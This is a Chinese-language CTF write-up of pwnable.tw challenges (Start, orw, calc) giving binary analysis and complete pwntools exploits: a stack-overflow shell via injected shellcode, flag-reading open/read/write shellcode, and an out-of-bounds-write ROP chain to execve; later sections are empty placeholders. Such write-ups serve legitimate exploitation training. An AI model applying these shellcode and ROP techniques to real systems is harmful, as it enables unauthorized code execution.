---
title: Pwnable_tw WriteUp
pubDate: 2026-02-26T11:07:00
category: Write Up
description: pwnable.tw网站题目全解 持续更新中……
---
## Start

### 信息收集

![Start-pwnable_tw-20260221153851-ayvy24e.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153851-ayvy24e.png)
先检查一下程序类型：静态链接

![Start-pwnable_tw-20260221153854-n56ato4.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153854-n56ato4.png)
看一下程序保护机制：全关

#### 静态分析

核心思路分解：

1、初始化阶段

- `push ebp`：将当前地址压栈
- `push offset \_exit`：将退出函数压栈
- 接着连续`push`了5个十六进制数，其实就是字符串"Let's start the CTF:"（共20个字节）

2、打印字符串

- `mov ecx，esp`：将当前栈顶（即字符串的位置）赋给ecx
- `mov dl，14h`：长度为20
- `mov bl 1`：文件描述符为1（stdout）
- `mov al，4`：系统调用号为4（sys_write）
- `int 80h`：执行打印

3、漏洞点

- `xor ebx，ebx`：ebx清零，即文件描述符0（stdin）
- `mov dl 3Ch`：预设读取长度为60字节（0x3C）
- `mov al 3`：系统调用号为3（sys_read）
- `int 80h`：执行读取

返回阶段

- `add esp，14h`：平衡栈空间（抬高20字节，正好跳过刚才压入的字符串）
- `retn`：返回

漏洞发现：

程序在栈上只预留了20字节的空间（就是存字符串的那块地儿），但 sys_read 却允许读入60字节，这导致了栈溢出，我们可以覆盖返回地址，控制程序的执行流。

### 利用思路

第一阶段：泄露栈地址

由于我们不知道栈的具体位置，无法直接跳转到 shellcode，所以需要先泄露栈地址

1. 利用溢出，将返回地址覆盖为 `0x08048087`（即`mov ecx，esp`那一行）
2. 程序会再次执行``sys_write`
3. 此时栈顶正好存着程序头`push esp`压入的地址。执行`write`时，程序会把这个栈地址打印出来
4. 接收这4字节数据，我们就拿到了栈的基址

第二阶段

1. 拿到栈地址后，计算出我们 shellcode 存放的位置
2. 第二次触发`sys_read`时，构造payload
3. 程序执行`retn`时，会调到栈上执行我们的 shellcode，从而拿到 shell

### 编写 Exploitation 脚本 (Python)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./start_patched")

context.binary = exe
context.arch = "i386"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10000)
    return r


def main():
    p = conn()
    
    leak_addr = 0x08048087
    payload1 = flat(["A" * 20, leak_addr])

    p.sendafter("Let's start the CTF:", payload1)

    # 获取泄露的 esp 地址
    leaked_esp = u32(p.recv(4))
    print(f"Leaked ESP: {hex(leaked_esp)}")

    # 2. 编写并发送 Shellcode
    # 经典的 32 位 execve("/bin/sh") shellcode (23 bytes)
    shellcode = asm(
        """
        push 0x0068732f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov eax, 0xb
        int 0x80
        """,
        arch="i386",
    )

    # 覆盖返回地址，跳转到栈上的 shellcode 位置
    # 这里的偏移 20 是因为我们返回地址之后紧跟着就是 shellcode
    payload2 = b"A" * 20 + p32(leaked_esp + 20) + shellcode

    log.info(payload2)
    p.send(payload2)

    # 开启交互
    p.interactive()


if __name__ == "__main__":
    main()
```

### 思考

为什么`payload2 = b"A" * 20 + p32(leaked_esp + 20) + shellcode`此处的偏移是20而不是24？

![Start-pwnable_tw-20260221153859-wo1fu8b.png](https://image.iswxl.cn/meblog/Start-pwnable_tw-20260221153859-wo1fu8b.png)

## orw

### 信息收集

![orw-pwnable_tw-54132c0f594d46.png](https://image.iswxl.cn/meblog/orw-pwnable_tw-54132c0f594d46.png)
先检查一下程序类型：静态链接

![orw-pwnable_tw-36d58b2f714412.png](https://image.iswxl.cn/meblog/orw-pwnable_tw-36d58b2f714412.png)
看一下程序保护机制：全关

#### 静态分析

程序流程

- `main`函数首先调用了`orw_seccomp()`
- 接着打印“Give my your shellcode：”
- 使用`read`函数读取`0x8C`（200）字节的数据到全局变量shellcode（位于`.bss`段，地址`0x0804A060`）
- 最后，程序直接跳转到 shellcode 地址执行：`call eax`

核心限制：Seccomp

- `orw_seccomp`函数中通过`prctl`加载了Seccomp（Secure Computing）过滤器
- 根据题目描述，只能使用`open`、`read`、`write`

### 利用思路

既然不能拿shell，我们的目标就是手动写一段shellcode，按照下面的步骤读取服务器上的flag：

1. Open：打开flag文件（根据题目描述得知flag文件位置`/home/orw/flag`）
2. Read：读取文件内容到内存中
3. Write：将内存中的内容写入到标准输出（stdout，文件描述符位1）

### 编写 Exploitation 脚本 (Python)

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./orw_patched")

context.binary = exe
context.arch = "i386"


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("chall.pwnable.tw", 10001)

    return r


def main():
    p = conn()

    shellcode = shellcraft.open("/home/orw/flag")
    shellcode += shellcraft.read("eax", "esp", 64)
    shellcode += shellcraft.write(1, "esp", 64)
  
    log.info(shellcode)
  
    payload = asm(shellcode)
  
    p.sendline(payload)
  
    p.interactive()
  
  
if __name__ == "__main__":
    main()
```


## calc-施工中

### 信息收集

![[assets/Pwnable_tw/calc/calc-pwnable_tw-8b33b65b75e8c5.png]]
先检查一下程序类型：32位静态编译

![[assets/Pwnable_tw/calc/calc-pwnable_tw-dcdd2cbed2b4c7.png]]
看一下程序的保护机制：开了Canary和NX

#### 静态分析

这个程序是一个简易的计算器的实现，其核心漏洞在于表达式解析漏洞中的数组越界（OOB）控制，程序定义了一个整形数组`int v1[101]`作为操作数栈，其中`v1[0]`被用作栈顶指针（即当前操作数的个数）

parse_expr函数中，在解析表达式时，程序通过判断字符是否为运算符（`+`，`-`，`*`，`/`，`%`）来决定是压入数字还是进行运算，在正常情况下，输入`1+2`，`1`被压入`v1[1]`，`v1[0]`变为1，遇到 `+`，解析 `2` 并压入 `v1[2]`，`v1[0]` 变为 2；然后执行 `eval`，将结果存入 `v1[1]`，`v1[0]` 减 1，异常情况下，如果输入 `+361`（以运算符开头），解析器在处理第一个字符 `+` 时，由于它不是数字，逻辑会进入运算符处理分支，在某些实现逻辑中，如果首字符是 `+`，它不会压入新的数字，而是直接修改当前 `v1[0]` 的值，或者将后续的数字直接运算到 `v1[v1[0]]` 指向的位置，这使得我们可以通过 `+index` 的方式，让 `v1[0]` 指向 `v1` 数组之外的栈空间

### 利用思路

#### 偏移计算

在 `calc` 函数中，局部数组 `v1` 的起始地址距离当前函数的 `ebp` (基址指针) 是 `0x5A0` 字节，因为 `v1` 是一个 `int` 类型的数组（每个元素占 4 字节），所以 `ebp` 对应的数组索引就是 `0x5A0 / 4 = 360`

`v1[360]` 存放的是上一层函数（`main` 函数）的 `ebp`

`v1[361]` 存放的则是当前函数的返回地址 (saved EIP)

#### 泄露栈地址 (Leak)

向程序发送 `+360`。因为是以 `+` 开头，程序不会压入新数字，而是将内部的栈指针 `v1[0]` 指向 `360`，然后打印出 `v1[360]` 的值

这样我们就成功泄露出了 `main` 函数的 `ebp`（栈上的一个绝对地址）。我们需要这个地址来计算一会要写入的 `/bin/sh` 字符串在内存中的确切位置

#### 寻找 ROP Gadgets

由于程序开启了 NX（堆栈不可执行）并且是静态编译，无法使用 ret2libc，所以这里直接在二进制文件内部寻找 Gadgets，准备发起 `execve` 系统调用（系统调用号为 `0xb` 即 `11`）

#### 构造 ROP 链

参数布局：系统调用 `execve` 需要 `eax=11`, `ebx=&"/bin/sh"`, `ecx=0`, `edx=0`。
地址计算的数学魔法 (`binsh_addr`)

`saved_ebp` 是 `main_ebp`。经过调试可知，在这个题目中，`calc_ebp` = `main_ebp - 0x20`

返回地址 (EIP) 的位置在 `calc_ebp + 4`

字符串 `/bin/sh` 被追加在整个 ROP 链（8 个元素，占 32 字节）的后面

所以字符串的精确地址 = `calc_ebp` + `4 (返回地址的偏移)` + `32 (前面ROP占用的空间)`
代入公式即为：`saved_ebp - 0x20 + 4 + len(payload)*4`

追加的 `0x6e69622f` 和 `0x0068732f` 是 `/bin` 和 `/sh\x00` 的小端序 ASCII 码

#### 执行越界写入 (OOB Write)

核心技巧：程序开启了 Canary（栈保护），并且我们不想破坏它。通过发送 `+361` 这种格式，程序执行 `v1[361] = v1[361] + 你的输入`

脚本非常聪明地采用了**“读取当前值 $\rightarrow$ 计算差值 $\rightarrow$ 发送差值相加”的策略

假设当前栈上的垃圾数据是 `X`，我们想写入的目标地址是 `Y`

差值 `diff = Y - X`

让程序执行 `X + diff`，结果就完美变成了 `Y`！这相当于获得了任意地址修改的能力，同时完美处理了 Python 处理 32 位有符号整数的麻烦

#### 触发漏洞

`io.sendline()` 发送了一个空行

回看汇编代码中的 `get_expr` 函数，如果读入空行，它会返回 0。这导致 `calc` 函数内部的 `while(1)` 循环被 `break`

循环打破后，`calc` 函数执行 `leave; ret`。此时它的栈顶已经被我们替换成了 ROP 链，程序直接飞向我们的代码，弹出了 Shell

### 编写 Exploitation 脚本 (Python)

```python
#!/usr/bin/env python3
from pwn import *

exe = ELF("./calc_patched")
context.binary = exe
context.log_level = "debug"


def conn():
    if args.LOCAL:
        return process(exe.path)
    else:
        return remote("chall.pwnable.tw", 10100)


def main():
    p = conn()

    offset_to_saved_ebp = int(0x5A0 / 4)  # v1/a2 [ebp-0x5A0]
    offset_to_saved_eip = offset_to_saved_ebp + 1

    p.recv()
    p.sendline("+" + str(offset_to_saved_ebp))
    saved_ebp = int(p.recvline().strip())

    rop_obj=ROP(exe)
    pop_eax = rop_obj.find_gadget(['pop eax','ret'])  # pop eax; ret
    pop_ecx_ebx = rop_obj.find_gadget(['pop ecx','pop ebx'])  # pop ecx; pop ebx; ret
    pop_edx = 0x080701AA  # pop edx; ret
    int_0x80 = 0x08049A21  # int 0x80

    payload = [pop_eax, 0xB]  # eax = 0xb (execve syscall number)
    payload += [pop_edx, 0]  # edx = 0
    payload += [pop_ecx_ebx, 0, 0]  # ecx = 0, ebx = &"/bin/sh"
    payload += [int_0x80]  # syscall
    binsh_addr = saved_ebp - 0x20 + len(payload) * 4 + 4
    log.info("binsh_addr: " + hex(binsh_addr))
    payload[6] = binsh_addr
    payload += [0x6E69622F, 0x0068732F]  # "/bin/sh" in little-endian

    for i in range(len(payload)):
        p.sendline("+" + str(offset_to_saved_eip + i))
        val = int(p.recvline().strip())

        diff = payload[i] - val

        if diff < 0:  # negative difference, can not use "+"
            p.sendline("+" + str(offset_to_saved_eip + i) + str(diff))
        else:
            p.sendline("+" + str(offset_to_saved_eip + i) + "+" + str(diff))
        p.recv()

    p.sendline()
    p.interactive()


if __name__ == "__main__":
    main()
```

## dubblesort-施工中

### 信息收集

![[assets/Pwnable_tw/dubblesort/dubblesort-pwnable_tw-f3a5cd4cbdf10f.png]]


![[assets/Pwnable_tw/dubblesort/dubblesort-pwnable_tw-5f44dcd56289da.png]]


#### 静态分析



### 利用思路



### 编写 Exploitation 脚本 (Python)



## Silver Bullet-施工中

### 信息收集

#### 静态分析



### 利用思路



### 编写 Exploitation 脚本 (Python)



## appstore-施工中

### 信息收集

#### 静态分析



### 利用思路



### 编写 Exploitation 脚本 (Python)


